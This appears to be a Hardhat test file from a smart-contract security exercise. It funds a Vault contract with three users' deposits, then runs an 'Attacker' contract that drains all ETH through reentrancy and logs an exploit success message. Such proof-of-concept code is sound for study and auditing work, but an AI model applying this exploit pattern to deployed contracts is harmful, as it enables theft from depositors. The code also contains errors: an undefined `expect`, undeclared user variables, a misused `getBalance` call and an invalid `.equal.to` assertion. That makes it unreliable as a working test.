const { ethers } = require("hardhat");

describe("ReentrancyAttack", function () {
  let vault;
  let attacker;

  before(async () => {
    [attacker, user1, user2, user3] = await ethers.getSigners();

    const Vault = await ethers.getContractFactory("Vault");
    vault = await Vault.deploy();

    //Deposit 3 users
    await vault.connect(user1).depositETH({ value: 100 });
    await vault.connect(user2).depositETH({ value: 200 });
    await vault.connect(user3).depositETH({ value: 300 });

    console.log(
      `total vault locked ETH: ${await ethers.getBalance(vault.address)}`
    );
  });

  it("attack", async () => {
    const Attack = await ethers.getContractFactory("Attacker");
    const attack = await Attack.deploy(vault.address);
    await attack.attack({ value: 10 });

    console.log(
      `total vault locked ETH: ${await ethers.getBalance(vault.address)}`
    );
    expect(await ethers.getBalance(vault.address)).equal.to(0);
    console.log("[Exploit Vault] success");
  });
});
